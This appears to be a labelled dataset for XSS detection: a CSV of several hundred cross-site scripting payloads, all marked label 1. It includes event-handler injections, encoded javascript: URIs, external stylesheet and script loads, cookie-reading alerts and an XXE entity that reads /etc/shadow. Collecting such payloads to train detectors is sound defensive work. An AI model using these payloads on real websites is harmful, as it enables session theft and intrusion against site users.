payload,label
"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",1
<em id=x tabindex=1 ondeactivate=alert(1)></em><input id=y autofocus>,1
<dl id=x tabindex=1 onfocus=alert(1)></dl>,1
"<marquee onkeydown=""alert(1)"" contenteditable>test</marquee>",1
"<nobr onmouseenter=""alert(1)"">test</nobr>",1
"<basefont draggable=""true"" ondragleave=""alert(1)"">test</basefont>",1
"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",1
"<pre onmouseleave=""alert(1)"">test</pre>",1
&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;,1
<form id=x tabindex=1 onbeforeactivate=alert(1)></form>,1
<param id=x tabindex=1 onactivate=alert(1)></param>,1
"<xmp onmouseenter=""alert(1)"">test</xmp>",1
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,1
"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",1
<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>,1
<nextid id=x tabindex=1 onfocusin=alert(1)></nextid>,1
"<style>:target {transform: rotate(180deg);}</style><var id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></var>",1
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1
<script>a=/XSS/\ndocument.vulnerable=true;</script>,1
"<ins onpaste=""alert(1)"" contenteditable>test</ins>",1
"<image onmouseup=""alert(1)"">test</image>",1
<frameset onblur=alert(1) tabindex=1 id=x></frameset><input autofocus>,1
"<style>@keyframes slidein {}</style><slot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></slot>",1
"<style>:target {transform: rotate(180deg);}</style><noframes id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noframes>",1
"<style>:target {transform: rotate(180deg);}</style><content id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></content>",1
"<main ondblclick=""alert(1)"">test</main>",1
"<dt draggable=""true"" ondrag=""alert(1)"">test</dt>",1
<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>,1
"<frame oncut=""alert(1)"" contenteditable>test</frame>",1
"<style>:target {transform: rotate(180deg);}</style><embed id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></embed>",1
"<content oncontextmenu=""alert(1)"">test</content>",1
"<th onmouseleave=""alert(1)"">test</th>",1
<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>,1
<q id=x tabindex=1 onfocusin=alert(1)></q>,1
<head id=x tabindex=1 ondeactivate=alert(1)></head><input id=y autofocus>,1
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",1
"&lt;STYLE&gt;li {list-style-image&#58; url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS",1
"<label onkeypress=""alert(1)"" contenteditable>test</label>",1
"<shadow oncopy=""alert(1)"" contenteditable>test</shadow>",1
"<style>:target {transform: rotate(180deg);}</style><nobr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nobr>",1
"<track draggable=""true"" ondragstart=""alert(1)"">test</track>",1
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>,1
<style>@import'http://www.securitycompass.com/xss.css';</style>,1
"<style>@keyframes slidein {}</style><dt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dt>",1
"<menuitem onkeydown=""alert(1)"" contenteditable>test</menuitem>",1
<svg><sub onload=alert(1)></sub>,1
"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",1
"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",1
<label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>,1
"<meta onbeforecut=""alert(1)"" contenteditable>test</meta>",1
<fieldset id=x tabindex=1 onbeforeactivate=alert(1)></fieldset>,1
"<BR SIZE=""&{javascript:alert(1)}"">",1
"&lt;STYLE&gt;BODY{-moz-binding&#58;url(\""http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\"")}&lt;/STYLE&gt;",1
"<rp draggable=""true"" ondragend=""alert(1)"">test</rp>",1
"<BR SIZE=""&{alert('XSS')}"">",1
<applet id=x tabindex=1 onactivate=alert(1)></applet>,1
&lt;/BODY&gt;&lt;/HTML&gt;,1
"<table onkeypress=""alert(1)"" contenteditable>test</table>",1
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",1
<svg><footer onload=alert(1)></footer>,1
"<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",1
"<sup onpaste=""alert(1)"" contenteditable>test</sup>",1
<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,1
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationstart=""alert(1)""></nobr>",1
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;,1
"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionend=alert(1)></nextid>",1
"<mark onbeforepaste=""alert(1)"" contenteditable>test</mark>",1
"<rt onkeypress=""alert(1)"" contenteditable>test</rt>",1
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:///etc/shadow"">]><foo>&xee;</foo>",1
"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tt>",1
"<output draggable=""true"" ondragend=""alert(1)"">test</output>",1
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,1
<datalist id=x tabindex=1 onbeforedeactivate=alert(1)></datalist><input autofocus>,1
"<source draggable=""true"" ondrag=""alert(1)"">test</source>",1
<noframes onfocusout=alert(1) tabindex=1 id=x></noframes><input autofocus>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><footer id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></footer>",1
"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",1
"<tt onmouseover=""alert(1)"">test</tt>",1
"<picture><source srcset=""validimage.png""><img onloadstart=alert(1)></picture>",1
"<figure oncut=""alert(1)"" contenteditable>test</figure>",1
"<body onLoad=""while(true) alert('XSS');"">",1
<li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>,1
<td id=x tabindex=1 onactivate=alert(1)></td>,1
"<XSS STYLE=""xss:expression(javascript:alert(1))"">",1
"<q onkeyup=""alert(1)"" contenteditable>test</q>",1
"<strike onmouseenter=""alert(1)"">test</strike>",1
"<style>@keyframes x{}</style><header style=""animation-name:x"" onanimationend=""alert(1)""></header>",1
<td id=x tabindex=1 onbeforeactivate=alert(1)></td>,1
<body onpopstate=alert(1)>,1
"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>",1
"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>",1
"<;XML SRC="";http://ha.ckers.org/xsstest.xml""; ID=I>;<;/XML>;",1
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;,1
"<progress onmouseout=""alert(1)"">test</progress>",1
"<style>@keyframes slidein {}</style><rt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rt>",1
"<div draggable=""true"" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>",1
"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",1
"<plaintext ondblclick=""alert(1)"">test</plaintext>",1
"<rtc oncontextmenu=""alert(1)"">test</rtc>",1
"<source onkeypress=""alert(1)"" contenteditable>test</source>",1
"<div STYLE=""width: expression(document.vulnerable=true);"">",1
"<plaintext onmouseleave=""alert(1)"">test</plaintext>",1
<ol id=x tabindex=1 onbeforeactivate=alert(1)></ol>,1
"<style>:target {color:red;}</style><svg id=x style=""transition:color 1s"" ontransitionend=alert(1)></svg>",1
"<style>@keyframes slidein {}</style><del style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></del>",1
"<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div>",1
"<hr onkeypress=""alert(1)"" contenteditable>test</hr>",1
"<menuitem oncut=""alert(1)"" contenteditable>test</menuitem>",1
"<link onmouseleave=""alert(1)"">test</link>",1
"<tfoot onmouseup=""alert(1)"">test</tfoot>",1
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,1
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",1
"<IMG SRC=x onkeydown=""alert(String.fromCharCode(88,83,83))"">",1
"<del onmouseleave=""alert(1)"">test</del>",1
<aside id=x tabindex=1 onfocusin=alert(1)></aside>,1
"<noframes onkeyup=""alert(1)"" contenteditable>test</noframes>",1
"<ul oncontextmenu=""alert(1)"">test</ul>",1
"<main onpaste=""alert(1)"" contenteditable>test</main>",1
"<time onpaste=""alert(1)"" contenteditable>test</time>",1
"<keygen onmouseenter=""alert(1)"">test</keygen>",1
"<style>@keyframes slidein {}</style><wbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></wbr>",1
"<dl onmousedown=""alert(1)"">test</dl>",1
"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",1
"<rtc draggable=""true"" ondrag=""alert(1)"">test</rtc>",1
"<dl onclick=""alert(1)"">test</dl>",1
"<div draggable=""true"" contenteditable>drag me</div><td ondragover=alert(1) contenteditable>drop here</td>",1
"<xmp onmousemove=""alert(1)"">test</xmp>",1
"<body draggable=""true"" ondragend=""alert(1)"">test</body>",1
"<footer onmousedown=""alert(1)"">test</footer>",1
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,1
"<;LAYER SRC="";http://ha.ckers.org/scriptlet.html"";>;<;/LAYER>;",1
"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",1
"<iframe draggable=""true"" ondragenter=""alert(1)"">test</iframe>",1
<aside id=x tabindex=1 onactivate=alert(1)></aside>,1
&lt,1
"<basefont draggable=""true"" ondragend=""alert(1)"">test</basefont>",1
SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
"<a onkeyup=""alert(1)"" contenteditable>test</a>",1
"<source onbeforecut=""alert(1)"" contenteditable>test</source>",1
"g'""></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250",1
"<rt onbeforecut=""alert(1)"" contenteditable>test</rt>",1
"<;A HREF="";http://0102.0146.0007.00000223/"";>;XSS<;/A>;",1
"<dd onmouseup=""alert(1)"">test</dd>",1
<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>,1
"<div onmouseout=""alert(1)"">test</div>",1
<body onscroll=alert(1)><br><br><br><br>,1
"<img draggable=""true"" ondragenter=""alert(1)"">test</img>",1
%253cscript%253ealert(document.cookie)%253c/script%253e,1
"<sup oncontextmenu=""alert(1)"">test</sup>",1
"<div draggable=""true"" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>",1
"<time draggable=""true"" ondrag=""alert(1)"">test</time>",1
<nobr id=x tabindex=1 onbeforedeactivate=alert(1)></nobr><input autofocus>,1
"<col onmousedown=""alert(1)"">test</col>",1
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><spacer id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></spacer>",1
<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>,1
<font id=x tabindex=1 ondeactivate=alert(1)></font><input id=y autofocus>,1
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,1
"<img onbeforecopy=""alert(1)"" contenteditable>test</img>",1
"<h1 onmouseover=""alert(1)"">test</h1>",1
"<image draggable=""true"" ondragenter=""alert(1)"">test</image>",1
<optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>,1
"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",1
"<q onmouseenter=""alert(1)"">test</q>",1
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onanimationend=""alert(1)""></figure>",1
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;,1
"<head onkeypress=""alert(1)"" contenteditable>test</head>",1
"<noscript onbeforepaste=""alert(1)"" contenteditable>test</noscript>",1
<image id=x tabindex=1 onfocus=alert(1)></image>,1
"<strike draggable=""true"" ondrag=""alert(1)"">test</strike>",1
<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>,1
<legend id=x tabindex=1 onfocusin=alert(1)></legend>,1
"<style>:target {color: red;}</style><footer id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></footer>",1
<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>,1
"<strike onmouseleave=""alert(1)"">test</strike>",1
"<div draggable=""true"" contenteditable>drag me</div><title ondrop=alert(1) contenteditable>drop here</title>",1
"<dialog onmousedown=""alert(1)"">test</dialog>",1
"!--"" /><script>alert('xss');</script>",1
"<param onmousemove=""alert(1)"">test</param>",1
"""`'><script>\x3Bjavascript:alert(1)</script>",1
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",1
"<canvas onclick=""alert(1)"">test</canvas>",1
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",1
"<div draggable=""true"" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>",1
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,1
"<meter draggable=""true"" ondrag=""alert(1)"">test</meter>",1
"<tfoot onbeforepaste=""alert(1)"" contenteditable>test</tfoot>",1
<!--[if]><script>javascript:alert(1)</script -->,1
"<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",1
<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>,1
<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>,1
"<style>:target {transform: rotate(180deg);}</style><em id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></em>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dt>",1
<svg><set onbegin=alert(1) attributename=x dur=1s>,1
"<ul onmouseout=""alert(1)"">test</ul>",1
"<image onmouseenter=""alert(1)"">test</image>",1
"<font draggable=""true"" ondragenter=""alert(1)"">test</font>",1
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(1)""></video>",1
"<;IMG&#x0D;SRC&#x0D;=&#x0D;"";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;"";&#x0D;>;&#x0D;",1
"a=""get"";b=""URL"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",1
"<;IMG LOWSRC="";javascript:alert(';XSS';);"";>;",1
<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>,1
"&lt;IMG SRC=`javascript&#058;alert(\""RSnake says, 'XSS'\"")`&gt;",1
<img src=validimage.png onloadstart=alert(1)>,1
<script>alert(1)//,1
"<style>:target {transform: rotate(180deg);}</style><element id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></element>",1
"<body onbeforeunload=""location='javascript:alert(1)'"">",1
"<form draggable=""true"" ondragleave=""alert(1)"">test</form>",1
"<marquee onmouseover=""alert(1)"">test</marquee>",1
"<time onmousedown=""alert(1)"">test</time>",1
"<mark onkeyup=""alert(1)"" contenteditable>test</mark>",1
<x/onxxx=1,1
<svg><td onload=alert(1)></td>,1
"<u onmousemove=""alert(1)"">test</u>",1
"""><script>alert(0)</script>",1
"`-alert(1)"">'onload=""`<svg/1='",1
"<style>@keyframes slidein {}</style><link style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></link>",1
<svg><element onload=alert(1)></element>,1
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
<menuitem id=x tabindex=1 onactivate=alert(1)></menuitem>,1
"<a onbeforecut=""alert(1)"" contenteditable>test</a>",1
"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>",1
"<style onkeypress=""alert(1)"" contenteditable>test</style>",1
"<summary onmousemove=""alert(1)"">test</summary>",1
&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;,1
"<dd draggable=""true"" ondrag=""alert(1)"">test</dd>",1
"<option onmouseout=""alert(1)"">test</option>",1
"<a href=""\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1
"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",1
"<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>",1
"<rt onmouseenter=""alert(1)"">test</rt>",1
<meta id=x tabindex=1 onbeforeactivate=alert(1)></meta>,1
"<li draggable=""true"" ondrag=""alert(1)"">test</li>",1
